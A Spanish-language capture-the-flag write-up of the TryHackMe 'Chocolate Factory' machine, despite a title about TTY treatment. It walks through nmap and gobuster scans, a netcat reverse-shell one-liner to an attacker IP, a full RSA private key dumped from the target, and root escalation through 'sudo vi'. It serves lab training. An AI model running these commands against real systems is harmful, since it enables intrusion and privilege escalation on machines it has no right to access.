---
title: ¿Cómo realizar un tratamiento a la tty?
published: true
---

La máquina Chocolate Factory, es una máquina de TryHackMe en la que mediante la explotación de esta conseguiremos la flag del usuario y la de root así como una clave y la contraseña del usuario Charlie.


# [](#header-1)Enumeración

La enumeración se trata de una de las fases principales, en las que recolectamos la máxima información posible de la máquina víctima.

Usaremos nmap para analizar las seis primeras preguntas: 

```bash
nmap -p- --open --min-rate 5000 -vvv -n $IP-VICTIMA -oG allPorts
```

*  Escaneo todos los puertos abiertos: -p- --open

*  Mediante --min-rate 5000 indicamos que queremos emitir paquetes no más lentos que 5000 paquetes por segundo.

*  Triple verbose (-vvv) para que vaya reportando por consola los puertos abiertos y no tener que esperar al final del escaneo.

*  Para que el escaneo no aplique resolución DNS usamos -n

*  En mi caso exporto los puertos abiertos en formato grepeable (-oG) al archivo allPorts

```bash
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-09 08:39 EST
Initiating Connect Scan at 08:39
Scanning 10.10.172.6 [65535 ports]
Discovered open port 21/tcp on 10.10.172.6
Discovered open port 111/tcp on 10.10.172.6
Discovered open port 22/tcp on 10.10.172.6
Discovered open port 80/tcp on 10.10.172.6
Discovered open port 113/tcp on 10.10.172.6
Discovered open port 110/tcp on 10.10.172.6
Discovered open port 116/tcp on 10.10.172.6
Completed Connect Scan at 08:39, 23.29s elapsed (65535 total ports)
Nmap scan report for 10.10.172.6
Host is up, received user-set (0.049s latency).
Scanned at 2022-11-09 08:39:06 EST for 23s
Not shown: 51727 filtered tcp ports (no-response), 13801 closed tcp ports (conn-refused)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE    REASON
21/tcp  open  ftp        syn-ack
22/tcp  open  ssh        syn-ack
80/tcp  open  http       syn-ack
110/tcp open  pop3       syn-ack
111/tcp open  rpcbind    syn-ack
113/tcp open  ident      syn-ack
116/tcp open  ansanotify syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 23.34 seconds
```

Analizaremos la versión y servicio de cada uno de los puertos abiertos.

```bash
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.4.179
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-rw-r--    1 1000     1000       208838 Sep 30  2020 gum_room.jpg
|_auth-owners: ERROR: Script execution failed (use -d to debug)
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:31:bb:b5:1f:cc:cc:12:14:8f:f0:d8:33:b0:08:9b (RSA)
|   256 e7:1f:c9:db:3e:aa:44:b6:72:10:3c:ee:db:1d:33:90 (ECDSA)
|_  256 b4:45:02:b6:24:8e:a9:06:5f:6c:79:44:8a:06:55:5e (ED25519)
|_auth-owners: ERROR: Script execution failed (use -d to debug)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
|_auth-owners: ERROR: Script execution failed (use -d to debug)
110/tcp open  pop3?
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
|_auth-owners: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
111/tcp open  rpcbind?
| fingerprint-strings: 
|   NULL, RPCCheck: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
|_auth-owners: ERROR: Script execution failed (use -d to debug)
113/tcp open  ident?
| fingerprint-strings: 
|   GenericLines, GetRequest, HTTPOptions, JavaRMI, NULL, RTSPRequest, TerminalServerCookie, X11Probe: 
|_    http://localhost/key_rev_key <- You will find the key here!!!
|_auth-owners: ERROR: Script execution failed (use -d to debug)
116/tcp open  ansanotify?
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
|_auth-owners: ERROR: Script execution failed (use -d to debug)
```

Podemos logearnos mediante ftp como anonymous sin contraseña. Lo hacemos y nos reporta una imagen. Nos la llevamos a nuestro equipo con get.

Abrimos la página web con la IP porque el puerto 80 está abierto y nos reporta un panel de login.

Por otro lado, en el puerto 113 nos indica que podemos encontrar la clave en /key_rev_key

Además, usaré gobuster para encontrar directorios ocultos:

 ```bash
❯ gobuster dir -u http://10.10.172.6 -w /usr/share/wordlists/dirb/common.txt -t 25 -x php,html,txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.172.6
[+] Method:                  GET
[+] Threads:                 25
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
2022/11/09 08:45:35 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 276]
/.hta.php             (Status: 403) [Size: 276]
/.hta.html            (Status: 403) [Size: 276]
/.hta                 (Status: 403) [Size: 276]
/.hta.txt             (Status: 403) [Size: 276]
/.htaccess.html       (Status: 403) [Size: 276]
/.htaccess.txt        (Status: 403) [Size: 276]
/.htpasswd.html       (Status: 403) [Size: 276]
/.htaccess.php        (Status: 403) [Size: 276]
/.htpasswd.txt        (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/.htpasswd.php        (Status: 403) [Size: 276]
/home.php             (Status: 200) [Size: 569]
/index.html           (Status: 200) [Size: 1466]
/index.html           (Status: 200) [Size: 1466]
/server-status        (Status: 403) [Size: 276] 
                                                
===============================================================
2022/11/09 08:46:20 Finished
===============================================================
```

Encontramos /home.php en el que bypaseamos el login directamente y podemos ejecutar comandos. Intentaremos establecer una revershell para acceder a la máquina.

Desde <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Pentest Monkey</a> elegimos una de ellas, indicamos nuestra IP y el puerto por el que nos ponemos en escucha mediante netcat y lo ejecutamos.

> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f

Tenemos acceso:

```bash
❯ nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.8.4.179] from (UNKNOWN) [10.10.172.6] 33964
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ ls
home.jpg
home.php
image.png
index.html
index.php.bak
key_rev_key
validate.php
```

Abrimos key_rev_key y nos reporta la clave.

Además en validate.php nos reporta en texto claro la contraseña de Charlie.

```bash
$ ls
home.jpg
home.php
image.png
index.html
index.php.bak
key_rev_key
validate.php
$ cat validate.php
<?php
        $uname=$_POST['uname'];
        $password=$_POST['password'];
        if($uname=="charlie" && $password=="??????"){
                echo "<script>window.location='home.php'</script>";
        }
        else{
                echo "<script>alert('Incorrect Credentials');</script>";
                echo "<script>window.location='index.html'</script>";
        }
?>$ 

```

Por otro lado, nos dirigimos al directorio principal del usuario charlie y nos reporta una clave privada pero no podemos ver la flag del usuario.

```bash
$ pwd
/var/www/html
$ cd /home
$ ls
charlie
$ cd charlie
$ ls
teleport
teleport.pub
user.txt
$ cat teleport
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA4adrPc3Uh98RYDrZ8CUBDgWLENUybF60lMk9YQOBDR+gpuRW
1AzL12K35/Mi3Vwtp0NSwmlS7ha4y9sv2kPXv8lFOmLi1FV2hqlQPLw/unnEFwUb
L4KBqBemIDefV5pxMmCqqguJXIkzklAIXNYhfxLr8cBS/HJoh/7qmLqrDoXNhwYj
B3zgov7RUtk15Jv11D0Itsyr54pvYhCQgdoorU7l42EZJayIomHKon1jkofd1/oY
fOBwgz6JOlNH1jFJoyIZg2OmEhnSjUltZ9mSzmQyv3M4AORQo3ZeLb+zbnSJycEE
RaObPlb0dRy3KoN79lt+dh+jSg/dM/TYYe5L4wIDAQABAoIBAD2TzjQDYyfgu4Ej
Di32Kx+Ea7qgMy5XebfQYquCpUjLhK+GSBt9knKoQb9OHgmCCgNG3+Klkzfdg3g9
zAUn1kxDxFx2d6ex2rJMqdSpGkrsx5HwlsaUOoWATpkkFJt3TcSNlITquQVDe4tF
w8JxvJpMs445CWxSXCwgaCxdZCiF33C0CtVw6zvOdF6MoOimVZf36UkXI2FmdZFl
kR7MGsagAwRn1moCvQ7lNpYcqDDNf6jKnx5Sk83R5bVAAjV6ktZ9uEN8NItM/ppZ
j4PM6/IIPw2jQ8WzUoi/JG7aXJnBE4bm53qo2B4oVu3PihZ7tKkLZq3Oclrrkbn2
EY0ndcECgYEA/29MMD3FEYcMCy+KQfEU2h9manqQmRMDDaBHkajq20KvGvnT1U/T
RcbPNBaQMoSj6YrVhvgy3xtEdEHHBJO5qnq8TsLaSovQZxDifaGTaLaWgswc0biF
uAKE2uKcpVCTSewbJyNewwTljhV9mMyn/piAtRlGXkzeyZ9/muZdtesCgYEA4idA
KuEj2FE7M+MM/+ZeiZvLjKSNbiYYUPuDcsoWYxQCp0q8HmtjyAQizKo6DlXIPCCQ
RZSvmU1T3nk9MoTgDjkNO1xxbF2N7ihnBkHjOffod+zkNQbvzIDa4Q2owpeHZL19
znQV98mrRaYDb5YsaEj0YoKfb8xhZJPyEb+v6+kCgYAZwE+vAVsvtCyrqARJN5PB
la7Oh0Kym+8P3Zu5fI0Iw8VBc/Q+KgkDnNJgzvGElkisD7oNHFKMmYQiMEtvE7GB
FVSMoCo/n67H5TTgM3zX7qhn0UoKfo7EiUR5iKUAKYpfxnTKUk+IW6ME2vfJgsBg
82DuYPjuItPHAdRselLyNwKBgH77Rv5Ml9HYGoPR0vTEpwRhI/N+WaMlZLXj4zTK
37MWAz9nqSTza31dRSTh1+NAq0OHjTpkeAx97L+YF5KMJToXMqTIDS+pgA3fRamv
ySQ9XJwpuSFFGdQb7co73ywT5QPdmgwYBlWxOKfMxVUcXybW/9FoQpmFipHsuBjb
Jq4xAoGBAIQnMPLpKqBk/ZV+HXmdJYSrf2MACWwL4pQO9bQUeta0rZA6iQwvLrkM
Qxg3lN2/1dnebKK5lEd2qFP1WLQUJqypo5TznXQ7tv0Uuw7o0cy5XNMFVwn/BqQm
G2QwOAGbsQHcI0P19XgHTOB7Dm69rP9j1wIRBOF7iGfwhWdi+vln
-----END RSA PRIVATE KEY-----
```

# [](#header-1)Acceso al sistema

Intentaremos acceder mediante ella. Nos copiamos la clave privada en nuestro equipo bajo el nombre id_rsa y le damos permisos de ejecución con chmod 600.

Después, nos conectamos mediante ssh y la clave privada:

```bash
❯ ssh -i id_rsa charlie@10.10.172.6
The authenticity of host '10.10.172.6 (10.10.172.6)' can't be established.
ED25519 key fingerprint is SHA256:WwycVD8zBUVfJS6sNVj192MU3Q7P4rylVnanjGx/Q5U.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:23: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.172.6' (ED25519) to the list of known hosts.
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-115-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Nov  9 14:04:04 UTC 2022

  System load:  0.0               Processes:           604
  Usage of /:   43.6% of 8.79GB   Users logged in:     0
  Memory usage: 60%               IP address for eth0: 10.10.172.6
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Wed Oct  7 16:10:44 2020 from 10.0.2.5
Could not chdir to home directory /home/charley: No such file or directory
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

charlie@chocolate-factory:/$ 
```

Tenemos la flag del usuario.

# [](#header-1)Escalada de privilegios

Al hacer sudo -l para ver qué podemos ejecutar como root nos reporta lo siguiente:

```bash
charlie@chocolate-factory:/home/charlie$ sudo -l
Matching Defaults entries for charlie on chocolate-factory:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User charlie may run the following commands on chocolate-factory:
    (ALL : !root) NOPASSWD: /usr/bin/vi
```

Desde <a href="https://gtfobins.github.io/gtfobins/vi/#sudo">GTFOBins</a> vemos que con una simple linea al poder ejecutar vi como sudo podemos escalar privilegios:

> sudo vi -c ':!/bin/sh' /dev/null

```bash
charlie@chocolate-factory:/home/charlie$     sudo vi -c ':!/bin/sh' /dev/null

# whoami
root
# ls
teleport  teleport.pub  user.txt
# cd /root
# ls
root.py
```

Parece que tenemos la flag de root pero en formato .py

Intentamos ejecutarlo pero nos reporta una clave. ¿Será la clave que encontramos al principio? Es posible.

```bash
# python root.py
Enter the key:  ???????????????????????????????????????
__   __               _               _   _                 _____ _          
\ \ / /__  _   _     / \   _ __ ___  | \ | | _____      __ |_   _| |__   ___ 
 \ V / _ \| | | |   / _ \ | '__/ _ \ |  \| |/ _ \ \ /\ / /   | | | '_ \ / _ \
  | | (_) | |_| |  / ___ \| | |  __/ | |\  | (_) \ V  V /    | | | | | |  __/
  |_|\___/ \__,_| /_/   \_\_|  \___| |_| \_|\___/ \_/\_/     |_| |_| |_|\___|
                                                                             
  ___                              ___   __  
 / _ \__      ___ __   ___ _ __   / _ \ / _| 
| | | \ \ /\ / / '_ \ / _ \ '__| | | | | |_  
| |_| |\ V  V /| | | |  __/ |    | |_| |  _| 
 \___/  \_/\_/ |_| |_|\___|_|     \___/|_|   
                                             

  ____ _                     _       _       
 / ___| |__   ___   ___ ___ | | __ _| |_ ___ 
| |   | '_ \ / _ \ / __/ _ \| |/ _` | __/ _ \
| |___| | | | (_) | (_| (_) | | (_| | ||  __/
 \____|_| |_|\___/ \___\___/|_|\__,_|\__\___|
                                             
 _____          _                    
|  ___|_ _  ___| |_ ___  _ __ _   _  
| |_ / _` |/ __| __/ _ \| '__| | | | 
|  _| (_| | (__| || (_) | |  | |_| | 
|_|  \__,_|\___|\__\___/|_|   \__, | 
                              |___/  

flag????????????????????????????
```

Obtenemos así la flag de root.

Muchas gracias por leer este writeup, espero que te haya gustado!
